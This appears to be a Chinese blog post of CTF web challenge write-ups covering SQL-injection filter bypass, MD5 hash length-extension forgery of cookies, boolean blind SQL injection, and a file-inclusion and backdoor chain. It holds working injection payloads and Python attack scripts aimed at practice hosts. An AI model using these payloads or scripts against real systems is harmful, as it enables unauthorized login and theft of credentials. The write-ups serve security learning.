<h3 id="涉及范围-php源码，sql注入"><a href="#涉及范围-php源码，sql注入" class="headerlink" title="涉及范围:php源码，sql注入"></a>涉及范围:php源码，sql注入</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjreabq0woj307m03e3ya.jpg" alt="1"></p>
<p>看到页面,好像典型的sql注入，但是web日常先看源码</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjreau9f4pj30800100l8.jpg" alt="2"></p>
<p>好像有点提示，尝试去url访问source.txt,得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    die;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</div><div class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </div><div class="line">        <span class="built_in">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</div><div class="line">        <span class="built_in">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </div><div class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</div><div class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</div><div class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</div><div class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </div><div class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="built_in">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close(<span class="variable">$con</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一大块是判断两个变量uname,pwd是否为空。</li>
<li>第二大块是进行了sql过滤。</li>
<li>第三大块查询了数据库，flag被两个if包括着，第一个if限定查询结果只有一行，第二个if要求pwd相等</li>
</ul>
<p>由于sql过滤严格，sql注入尝试无果。<br>考虑从pwd相等入手，利用 <strong>or</strong>,<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external"><strong>limit offset</strong></a>,  <strong>#</strong> 先过滤第一个if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; limit 1 offset 0 #</div></pre></td></tr></table></figure></p>
<p>第二个if 用到 <a href="http://www.w3school.com.cn/sql/sql_groupby.asp" target="_blank" rel="external"><strong>group by</strong></a> 和 <a href="http://www.68idc.cn/help/mysqldata/mysql/20150607358491.html" target="_blank" rel="external">with rollup</a> （rollup–&gt;汇总,使group by的列的值为null,汇总其他列的数值）<br>利用这两个函数，构造 null = null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; group by pwd with rollup limit 1 offset 0#</div></pre></td></tr></table></figure></p>
<p>offset 0 到 n 尝试得到我们汇总 pwd = null 的那一行<br>同时使 pwd = null （不是填写null，空着就好）</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrebupellj30ic01ma9y.jpg" alt="4"><br></div>


<h2 id="9-18-有点意思吧"><a href="#9-18-有点意思吧" class="headerlink" title="[9.18]有点意思吧"></a>[9.18]有点意思吧</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：php源码，hash长度扩展攻击"><a href="#涉及范围：php源码，hash长度扩展攻击" class="headerlink" title="涉及范围：php源码，hash长度扩展攻击"></a>涉及范围：php源码，hash长度扩展攻击</h3><p>抓包，source这个参数有点奇怪，尝试改为1，得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</div><div class="line"></div><div class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</div><div class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</div><div class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</div><div class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</div><div class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一个if：要求cookie里的<strong>getmein</strong>不为空</li>
<li>第二个if：<strong>username</strong> 等于 admin ； <strong>password</strong> 不等于 ‘admin’</li>
<li>第三个if：getmein 等于 未知15位secret+username+password 的MD5</li>
</ul>
<p>因为MD5，url解码，一开始以为是php语言漏洞，诸多尝试无果。<br>仔细收集已有信息，分析问题如下<br>有 <strong>未知15位secret+’admin’+’admin’</strong> 的hash<br>求 <strong>未知15位secret+’admin’+password</strong> 的hash<br>查阅资料，新的知识盲区，密码学知识： <a href="//www.freebuf.com/articles/web/31756.html">hash长度扩展攻击</a><br>之后的题解就参考别人的吧：</p>
<ul>
<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">c语言MD5的题解</a>:最后一步计算MD5前512位随便是因为在C代码中ABCD改的不是初始值，而是512为整数的分组执行完毕之后的ABCD。</li>
<li><a href="http://blog.csdn.net/u010726042/article/details/70738279" target="_blank" rel="external">python的题解hashpumpy和hashpump</a></li>
</ul>
<p>然后是给自己以后看,方便回忆的粗糙原理手绘图QAQ<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrf3ssur3j31hc0u0n6d.jpg" alt="hash长度攻击,png"></p>
<ul>
<li>512位的分组后面第一位写1,再补零，后64位写原来的长度，使之生成的MD5与secretadminadmin的完全一致</li>
<li>本地生成MD5时，512位的分组随便填写，最后一次变换的ABCD值用secretadminadmin的MD5值转变来（高地位互换），之所以要512位的分组是让最后填充的长度数值相同</li>
</ul>
<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">戳这里=w=</a><br>此题前提：[9.18]有点意思吧</p>
<h3 id="涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><a href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本" class="headerlink" title="涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本"></a>涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</h3><div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm8frpyfj30no03xq2q.jpg" alt="1"><br></div>

<p>web日常1：先看源码，没啥东西。<br>web日常2：跑目录——用字典替换url后缀，访问，查看是否成功。可用burpsuite+字典 或 <a href="https://github.com/Err0rzz/SourceLeakHacker" target="_blank" rel="external">工具</a></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm8ujz3kj30m108iwj3.jpg" alt="2"><br></div>

<p>(多线程 HTTPConnectionPool问题 暂未解决)<br>看到<strong>index.php~</strong>,访问，下载过来一个文件<br>文件日常：拉到kali下用file，binwalk 判断文件类型和有没有隐藏 （后缀是~,和开头是 . 的文件在桌面不直接显示，需要<strong>ls</strong>查看）</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjsm91ak2kj30fs06jgnq.jpg" alt="3"><br></div>

<p><strong>vim的swp格式</strong>：vim编写的文件可能会有错误遗留文件：data.php –&gt; .data.php.swp (若修改文件再次错误 后缀变为.swo .swn 尾字母向前推移)</p>
<p>index.php~加上.swp后缀。用<strong>vim -r index.php~.swp</strong> 恢复读写模式可以打开，得到页面源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</div><div class="line">        body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;</div><div class="line">        &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">        &lt;?php</div><div class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                <span class="variable">$role</span> = <span class="string">"guest"</span>;</div><div class="line">                <span class="variable">$salt</span> =</div><div class="line">                <span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</div><div class="line">                        <span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</div><div class="line">                        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</div><div class="line">                        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">true</span>;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                        &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</div><div class="line">                        setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</div><div class="line">                        <span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</div><div class="line">                        setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</div><div class="line">                        <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is“</span></div><div class="line"><span class="string">                &#125; else &#123;</span></div><div class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">        ?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div></pre></td></tr></table></figure></p>
<p><a href="https://phperzh.com/articles/1814" target="_blank" rel="external">serialize与unserialize函数</a>      <a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="external">strrev函数</a><br>结合抓包，分析源码：</p>
<ul>
<li>要求 role不为空 ，此处必然满足，不考虑</li>
<li>要求 role反序列化后 === ‘admin’</li>
<li>要求 MD5（salt.role的反转字符串） === hsh</li>
<li>已知 MD5($salt.”<strong>;”tseug”:5:s</strong>“) = 3a4727d57463f122833d9e732f94e4e0<br>解决第一个反序列化后相等，利用<a href="https://phperzh.com/articles/1814" target="_blank" rel="external">php在线</a>测试序列化与反序列化的特性及漏洞：</li>
</ul>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm98tiabj30ug072q30.jpg" alt="4"><br></div>

<p><strong>序列化</strong>：根据数据结构变成特定的字符串，s为str，i为int，{ }为数组等等。<br><strong>反序列化</strong>：根据开头判断数据结构类型，只会读取该结构内的字符，后面的字符不做处理。</p>
<p>根据以上特性，使role开头 = <strong>s:5”admin”;</strong> 就可满足条件。</p>
<hr>
<p>解决第二个HASH相等，根据hash长度攻击的要求：</p>
<ul>
<li>因为反转，role的末尾需要 = <strong>s:5”guest”;</strong></li>
<li>salt的长度未知，考虑利用python脚本暴力破解</li>
</ul>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding=utf8</span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s ") = 3a4727d57463f122833d9e732f94e4e0 </span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s xxxxx ;"nimda":5:s ") = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashpumpy</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">hexdigest = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span>;</div><div class="line">original_data = <span class="string">";\"tseug\":5:s"</span>;</div><div class="line">data_to_add = <span class="string">";\"nimda\":5:s"</span>;</div><div class="line">url=<span class="string">"http://web.jarvisoj.com:32778"</span>;</div><div class="line"></div><div class="line"><span class="comment">#设置key_length的范围</span></div><div class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">	result = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length);</div><div class="line"></div><div class="line">	role_re = result[<span class="number">1</span>][::<span class="number">-1</span>];  	 <span class="comment">#16进制\x80 代表一个字符 可以直接对换</span></div><div class="line">	role = urllib.quote(role_re); 	 <span class="comment">#16进制直接url编码得到 %xx</span></div><div class="line">	hsh = result[<span class="number">0</span>];</div><div class="line">	cookies = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;;</div><div class="line">	</div><div class="line">	response = requests.get(url,cookies=cookies);</div><div class="line">	<span class="keyword">if</span> response.headers[<span class="string">'Content-Length'</span>] != <span class="string">'210'</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div><div class="line">		<span class="keyword">print</span> response.text</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm9frsbqj30lx0e977w.jpg" alt="5"><br></div>


<h2 id="9-1-看起来有点难啊"><a href="#9-1-看起来有点难啊" class="headerlink" title="[9.1]看起来有点难啊"></a>[9.1]看起来有点难啊</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：sql盲注"><a href="#涉及范围：sql盲注" class="headerlink" title="涉及范围：sql盲注"></a>涉及范围：sql盲注</h3><p>哎，做完之后感想，还是才学疏浅没有脑洞的J，第一步就卡死了。<br>进行以下sql注入尝试，尝试得到两种返回状况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin= 1’ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= 1’ or <span class="string">'1'</span>=<span class="string">'1'</span> --+  <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin‘ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin<span class="string">' and '</span>1<span class="string">'='</span>2<span class="string">' --+ pwd=1</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">admin= admin’</span></div></pre></td></tr></table></figure></p>
<p>总结出题目的三种返回状态：</p>
<ul>
<li><strong>数据库链接失败！</strong>：从数据库返回0行</li>
<li><strong>登录失败，错误的用户名和密码</strong>：从数据库有返回</li>
<li><strong>空白</strong>: sql语句错误</li>
</ul>
<p>有小朋友可能要提出，为啥要试admin呀，我一开始就是没有想到试admin，也没有用 or 找到三种返回的规律，两脸蒙蔽。<br>但是只要想到 <code>1’ or ‘1’=’1‘ and 巴拉巴拉 --+</code> 一样可以得到两种返回状态，只不过再需要盲注一下username得出admin<br>于是就是<strong>布尔型盲注</strong></p>
<p>然后就盲注套路走起来:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 username password</span></div><div class="line"></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and table.column is not null"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line">或</div><div class="line">sql=“admin<span class="string">' and substring(password,1,1)= '</span>i<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> ascii(substring(password,<span class="number">1</span>,<span class="number">1</span>)) = <span class="string">'123'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and password like '</span>i%<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> password = <span class="string">'flag'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and ascii(substring(password,%s,1))-10 -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> case when(substr(password,%s,<span class="number">1</span>)=<span class="string">'i'</span>) then sleep(<span class="number">10</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) -- ”</div><div class="line">sql=“admin<span class="string">' and if(substr(password,%s,1)='</span>i<span class="string">') ,sleep(10) , sleep(0) -- ”</span></div></pre></td></tr></table></figure></p>
<p>  另外在此题中不能使用select，简单尝试过滤无效，就不用类似<code>&quot;admin&#39; and (select password from table)&gt;0&quot;</code>注入。</p>
<p>  最后贴上跑username和password的代码，注意</p>
<ul>
<li>访问太频繁会被禁止访问，考虑sleep或改参数几位几位跑</li>
<li>页面编码不同无法直接显示匹配字符，右键返回页面查看源码发现是GB2312,解码匹配</li>
<li>chr() : ascii–&gt;字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'admin'</span>:sql %(i,x),<span class="string">'pass'</span>:<span class="string">'admin'</span>,<span class="string">'action'</span>:<span class="string">'login'</span>&#125;</div><div class="line">	response=requests.get(url,params=data)</div><div class="line">	<span class="comment">#print response.content.decode('GB2312')</span></div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'GB2312'</span>).find(<span class="string">'数据库'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">150</span>):</div><div class="line">		print(x),</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>脚本出username,password直接提交得到FLAG。</p>
<p>哎….常规套路的题目做了半天………QAQ</p>
<h2 id="皇家邮电平台"><a href="#皇家邮电平台" class="headerlink" title="皇家邮电平台"></a>皇家邮电平台</h2><p><a href="http://cms.nuptzj.cn/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><a href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用" class="headerlink" title="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"></a>涉及范围：源码泄露，本地文件包含，sql注入，后门利用</h3><p>这题题目步骤以及源码较多，自己写需要花大力气，查到两篇不错的writeup，互补贴用了。<br><a href="http://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/" target="_blank" rel="external">题解1</a><br><a href="http://blog.csdn.net/ni9htmar3/article/details/53791997" target="_blank" rel="external">题解2</a>（ctrl+f 皇家）<br>大致记录一下解题的点：</p>
<ul>
<li>观察各个页面的源代码，发现<code>file=sm.txt</code>,修改参数得到各个页面的源码</li>
<li>分析源码，得到更多页面，发现后台登录页面；</li>
<li>分析源码，sql只过滤一遍,过滤不严格，sql注入点在so.php</li>
<li>根据提示爆破账号密码</li>
<li>后台登录界面登录，得到回调木马</li>
<li>利用木马遍历目录，得到flag</li>
</ul>
